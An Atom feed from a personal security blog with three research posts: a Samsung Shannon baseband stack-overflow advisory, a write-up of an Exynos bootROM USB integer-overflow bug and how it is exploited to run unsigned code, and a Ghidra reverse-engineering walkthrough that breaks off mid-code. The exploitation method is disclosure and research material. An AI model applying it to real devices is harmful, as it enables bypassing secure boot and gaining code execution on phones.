<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>fred's notes</title><link href="https://fredericb.info/" rel="alternate"></link><link href="https://fredericb.info/feeds/all.atom.xml" rel="self"></link><id>https://fredericb.info/</id><updated>2020-11-23T00:00:00-07:00</updated><subtitle>Security &amp; Stuff</subtitle><entry><title>Remote stack overflow in Samsung baseband caused by malformed P-TMSI REALLOCATION COMMAND</title><link href="https://fredericb.info/2020/11/remote-stack-overflow-in-samsung-baseband-caused-by-malformed-p-tmsi-reallocation-command.html" rel="alternate"></link><published>2020-11-23T00:00:00-07:00</published><updated>2020-11-23T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-11-23:/2020/11/remote-stack-overflow-in-samsung-baseband-caused-by-malformed-p-tmsi-reallocation-command.html</id><summary type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message P-TMSI REALLOCATION COMMAND (9.4.7 in &lt;a href="https://www.etsi.org/deliver/etsi_ts/124000_124099/124008/13.07.00_60/ts_124008v130700p.pdf"&gt;TS 24.008&lt;/a&gt;) from network,
the length of the Mobile Identity IE (10.5.1.4) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TS 24.008 P-TMSI REALLOCATION COMMAND message" src="https://fredericb.info/blog/PTMSI/TS24.008_PTMSI-realloc-cmd.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Mobile identity data is directly copied to a stack buffer without prior size check. This stack …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Description&lt;/h1&gt;
&lt;p&gt;When Samsung Shannon baseband receives message P-TMSI REALLOCATION COMMAND (9.4.7 in &lt;a href="https://www.etsi.org/deliver/etsi_ts/124000_124099/124008/13.07.00_60/ts_124008v130700p.pdf"&gt;TS 24.008&lt;/a&gt;) from network,
the length of the Mobile Identity IE (10.5.1.4) is not properly checked.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TS 24.008 P-TMSI REALLOCATION COMMAND message" src="https://fredericb.info/blog/PTMSI/TS24.008_PTMSI-realloc-cmd.png" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Mobile identity data is directly copied to a stack buffer without prior size check. This stack overflow can lead to remote code execution in the Shannon modem.&lt;/p&gt;
&lt;h1&gt;CVSS Version 3 Metrics&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Attack Vector (AV): Adjacent (A)&lt;/li&gt;
&lt;li&gt;Attack Complexity (AC): Low (L)&lt;/li&gt;
&lt;li&gt;Privileges Required (PR): None (N)&lt;/li&gt;
&lt;li&gt;User Interaction (UI): None (N)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"&gt;Overall CVSS Score: 8.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Affected Versions&lt;/h1&gt;
&lt;p&gt;Discovered in Shannon baseband of Galaxy S8 (SM-G950FD), it may affect other models based on Exynos chipsets.&lt;/p&gt;
&lt;h1&gt;Solution&lt;/h1&gt;
&lt;p&gt;Samsung security update of December 2018 fixes this vulnerability.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2018-11-19 Working proof-of-concept&lt;/li&gt;
&lt;li&gt;2018-12-04 Bug fixed in Samsung security update &lt;a href="https://security.samsungmobile.com/securityUpdate.smsb"&gt;SMR-DEC-2018&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2018-12-05 Reconsider life choices&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="samsung"></category><category term="shannon"></category><category term="baseband"></category><category term="security"></category><category term="arm"></category></entry><entry><title>exynos-usbdl : unsigned code loader for Exynos BootROM</title><link href="https://fredericb.info/2020/06/exynos-usbdl-unsigned-code-loader-for-exynos-bootrom.html" rel="alternate"></link><published>2020-06-17T00:00:00-07:00</published><updated>2020-06-17T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-06-17:/2020/06/exynos-usbdl-unsigned-code-loader-for-exynos-bootrom.html</id><summary type="html">&lt;p&gt;In previous posts, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt; and &lt;a href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html"&gt;reverse its USB stack&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These efforts led to the discovery of a bug in the USB stack that can be exploited to run arbitrary code.&lt;/p&gt;
&lt;p&gt;The following chipsets are known to be affected by this bug :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Exynos 8890&lt;/li&gt;
&lt;li&gt;Exynos …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;In previous posts, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt; and &lt;a href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html"&gt;reverse its USB stack&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These efforts led to the discovery of a bug in the USB stack that can be exploited to run arbitrary code.&lt;/p&gt;
&lt;p&gt;The following chipsets are known to be affected by this bug :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Exynos 8890&lt;/li&gt;
&lt;li&gt;Exynos 8895&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://github.com/frederic/exynos-usbdl"&gt;exynos-usbdl, an open source tool available on Github&lt;/a&gt;, exploits this vulnerability to load and run unsigned code.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Good times with dental scraper" src="https://fredericb.info/blog/exy-bootrom/scraper.png"&gt;&lt;/p&gt;
&lt;h1&gt;Vulnerability details&lt;/h1&gt;
&lt;p&gt;Exynos BootROM implements a very simple USB protocol to receive a bootloader binary from an USB host. That binary is encapsulated in a small structure &lt;em&gt;dldata&lt;/em&gt;, and sent through USB bulk transfers.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dldata_s&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;unknown0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// header(8) + data(n) + footer(2)&lt;/span&gt;
    &lt;span class="n"&gt;u_int8_t&lt;/span&gt;  &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="c1"&gt;//example data of size &amp;#39;n&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;u_int16_t&lt;/span&gt; &lt;span class="n"&gt;unknown1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//footer&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;dldata&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Integer overflow bug&lt;/h2&gt;
&lt;p&gt;BootROM writes received data into buffer &lt;em&gt;dl_buf&lt;/em&gt; at address [0x02021800..0x02070000] (0x4E800 bytes).
But first, a check ensures that transferred data won't overflow &lt;em&gt;dl_buf&lt;/em&gt; buffer :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dl_buf&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dldata&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x02070000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;usb_download_status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x02&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//error&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, this check on 32 bits is vulnerable to an integer overflow if &lt;em&gt;dldata.size&lt;/em&gt; is higher than 0xFDFDE7FF (&lt;em&gt;dl_buf&lt;/em&gt; + 0xFDFDE800 ≡ 0x0 mod 2³²).&lt;/p&gt;
&lt;p&gt;So the bootROM accepts a payload of regular size [0x10..0x4E800] bytes (don't go below if you want to avoid integer underflows...), but due to that bug, &lt;strong&gt;also accepts a payload of [0xFDFDE800..0xFFFFFFFF] bytes.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Empty transfer trick&lt;/h2&gt;
&lt;p&gt;The integer overflow bug allows us to bypass the size check to send a very large payload to the bootROM.
Such contiguous memory overflow may corrupt memory after &lt;em&gt;dl_buf&lt;/em&gt; buffer, but the memory layout will cause the target to crash before any interesting (from attacker's point of view) memory corruption happens.&lt;/p&gt;
&lt;p&gt;First, because &lt;em&gt;dl_buf&lt;/em&gt; is located at the end of the in-use memory (after stack area, for example), so there's no bootROM runtime data to corrupt.
But also because accessing inexistent memory regions will cause a crash.&lt;/p&gt;
&lt;p&gt;Nevertheless, there's a trick to overcome that limitation. A large download is expected to be splitted into multiple small transfers of equal size (0xfffe00 bytes), except the last transfer which can be smaller.&lt;/p&gt;
&lt;p&gt;Each of these transfers triggers the USB transfer handler of the bootROM. This handler appends received data to the destination buffer &lt;em&gt;dl_buf&lt;/em&gt;. We would expect that &lt;em&gt;dl_buf&lt;/em&gt; pointer is then incremented by the size that has been appended. But instead, destination pointer &lt;em&gt;dl_buf&lt;/em&gt; is incremented by the expected transfer size (0xfffe00 bytes). So, by sending empty transfers (transfer without data), we can increment the destination pointer &lt;em&gt;dl_buf&lt;/em&gt; without actually writing any data, thus not risking any invalid memory access.&lt;/p&gt;
&lt;p&gt;With this technique, we can easily increase &lt;em&gt;dl_buf&lt;/em&gt; pointer to reach an address convenient for exploitation.&lt;/p&gt;
&lt;p&gt;Finally, the last transfer (non-empty this time) is used to corrupt memory pointed by manipulated address &lt;em&gt;dl_buf&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;In summary, we can write 512 bytes (or less) of arbitrary data in memory range [0x0..0x020217FF], at an arbitrary offset. In this memory range, multiple data structures can be overwritten to achieve arbitrary code execution: function pointers, stack region, etc...&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The USB boot feature in the Exynos bootROM only runs signed bootloader images (when Secure Boot is enabled).
However a pre-auth integer overflow bug allows an attacker with physical access to corrupt bootROM RAM.
So the attacker can execute arbitrary code in Secure World, at very early boot stage.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2020-02-12 &lt;a href="https://gist.github.com/frederic/6228d60b8ddcf959eb3bea105f49348e"&gt;Bug discovery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2020-**-** Proof-of-concept development&lt;/li&gt;
&lt;li&gt;2020-05-06 Vulnerability disclosed to Samsung&lt;/li&gt;
&lt;li&gt;2020-06-10 Report dismissed as duplicate&lt;/li&gt;
&lt;/ul&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="usb"></category><category term="exploit"></category></entry><entry><title>Reverse engineer USB stack of Exynos BootROM</title><link href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html" rel="alternate"></link><published>2020-06-16T00:00:00-07:00</published><updated>2020-06-16T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-06-16:/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html</id><summary type="html">&lt;p&gt;In the previous post, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exynos (8895 in this post) bootROM contains a minimal USB stack to load a signed bootloader from an USB host (a.k.a. boot from USB). 
This post summarizes how this USB stack can be reversed using the Great …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In the previous post, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exynos (8895 in this post) bootROM contains a minimal USB stack to load a signed bootloader from an USB host (a.k.a. boot from USB). 
This post summarizes how this USB stack can be reversed using the Great Tool &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt; and &lt;a href="https://opensource.samsung.com/"&gt;Linux kernel source code&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The goal is to locate and analyze the proprietary USB protocol used to load the bootloader in RAM.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Catch the dragon" src="https://fredericb.info/blog/exy-bootrom/CatchTheDragon.png" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;SoC level&lt;/h1&gt;
&lt;p&gt;Device Tree Source files in Linux kernel provide a detailed description (like physical address and size) of Exynos SoC peripherals, including the USB controller. In file &lt;em&gt;arch/arm64/boot/dts/exynos/exynos8895.dtsi&lt;/em&gt;, we learn that the USB controller is mapped at &lt;strong&gt;0x10C00000&lt;/strong&gt; (also known as base address):&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB controller in DTSI" src="https://fredericb.info/blog/exy-bootrom/dwc3Dtsi.png"&gt;&lt;/p&gt;
&lt;p&gt;Ghidra &lt;em&gt;Memory Map&lt;/em&gt; feature allows us to create a memory block that represents this USB peripheral :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Memory map in Ghidra" src="https://fredericb.info/blog/exy-bootrom/bootromMemMap.png"&gt;&lt;/p&gt;
&lt;p&gt;Don't forget to click &lt;strong&gt;Analysis&amp;gt;Auto Analyze&lt;/strong&gt; to update cross references to our new memory block.&lt;/p&gt;
&lt;h1&gt;Peripheral level&lt;/h1&gt;
&lt;p&gt;The Linux kernel also contains a list of registers and their offset to interact with the USB controller :&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB registers in kernel" src="https://fredericb.info/blog/exy-bootrom/dwc3Regs.png"&gt;&lt;/p&gt;
&lt;p&gt;Register offsets are relative to the base address mentioned earlier.
Based on this list, we can rename each USB register referenced from the bootROM code (&lt;strong&gt;Navigation-&amp;gt;Next Data&lt;/strong&gt;) :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Xrefs to USB registers in Ghidra" src="https://fredericb.info/blog/exy-bootrom/regsXrefs2.png"&gt;&lt;/p&gt;
&lt;p&gt;Adding names will help us to understand the purpose of functions that access these registers.&lt;/p&gt;
&lt;h1&gt;Driver level&lt;/h1&gt;
&lt;p&gt;BootROM functions that access USB registers directly are dedicated to USB operations. They are similar to the Linux USB driver code, but simplified since bootROM is bare metal code, without interrupt handlers, threads or even dynamic memory allocation.&lt;/p&gt;
&lt;p&gt;Despite the lack of public documentation, we can study the Linux USB driver code to understand the purpose of most important USB registers.&lt;/p&gt;
&lt;p&gt;With a better understanding of these registers, we can now infer the purpose of bootROM functions based on read/write operations they perform on these registers. In some cases, bootROM and Linux USB driver functions have such similar access patterns (to USB registers) that they can be quickly identified by comparison.&lt;/p&gt;
&lt;h2&gt;USB enumeration and configurration&lt;/h2&gt;
&lt;p&gt;Per USB specifications, when a new device is attached, USB host assigns it an unique address by sending the &lt;em&gt;Standard Device Request&lt;/em&gt; &lt;strong&gt;USB_REQ_SET_ADDRESS&lt;/strong&gt;. Device must then set its assigned address by writing it to register &lt;strong&gt;DWC3_DCFG&lt;/strong&gt;. And thanks to the Linux USB driver, we even know that device address is a 7-bit value at offset 3 in this register.&lt;/p&gt;
&lt;p&gt;By looking at references to &lt;strong&gt;DWC3_DCFG&lt;/strong&gt; in Ghidra, we can locate bootROM functions that access this register :&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB controller in DTSI" src="https://fredericb.info/blog/exy-bootrom/dwc3DCFG.png"&gt;&lt;/p&gt;
&lt;p&gt;Among these functions, only &lt;em&gt;write_DWC3_DCFG_DEVADDR&lt;/em&gt; sets device address in &lt;strong&gt;DWC3_DCFG&lt;/strong&gt; register :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_DWC3_DCFG_DEVADDR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;devaddr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cRead_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_DCFG&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_DCFG&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xfffffc00&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;devaddr&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x7f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;// DWC3_DCFG[3:7] : device address&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By exploring incoming function calls to &lt;em&gt;write_DWC3_DCFG_DEVADDR&lt;/em&gt;, we can easily locate the function that handles all incoming &lt;em&gt;Standard Device Requests&lt;/em&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_handle_standard_device_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;longlong&lt;/span&gt; &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;//[...]&lt;/span&gt;
  &lt;span class="n"&gt;bRequest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bRequest&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_REQ_SET_ADDRESS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;write_DWC3_DCFG_DEVADDR&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ulonglong&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="c1"&gt;//set device address assigned by USB host&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;undefined4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;puVar3&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bRequest&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_REQ_GET_DESCRIPTOR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;descriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;descriptorType&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_DT_DEVICE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;usb_init_device_descriptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sUSBBuffers_ptr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;event_buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x70&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x12&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;descriptorType&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_DT_CONFIG&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;puVar2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;USBBuffers_ptr&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;usb_init_descriptors&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;puVar2&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;event_buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x70&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="c1"&gt;//[...]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Among all &lt;em&gt;Standard Device Requests&lt;/em&gt; sent during USB enumeration phase, &lt;strong&gt;USB_REQ_GET_DESCRIPTOR&lt;/strong&gt; is another interesting one.&lt;/p&gt;
&lt;p&gt;USB descriptors are sent to USB host in order to describe device, interface &amp;amp; endpoints implemented by the device. These structures are part of the USB standard, so we can simply import structure definitions (struct USB_DESCRIPTORS &amp;amp; USB_DEVICE_DESCRIPTOR) from Linux kernel in Ghidra (&lt;strong&gt;File-&amp;gt;Parse C source...&lt;/strong&gt;) :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_init_device_descriptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USB_DEVICE_DESCRIPTOR&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_DEVICE&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdUSBL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdUSBH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
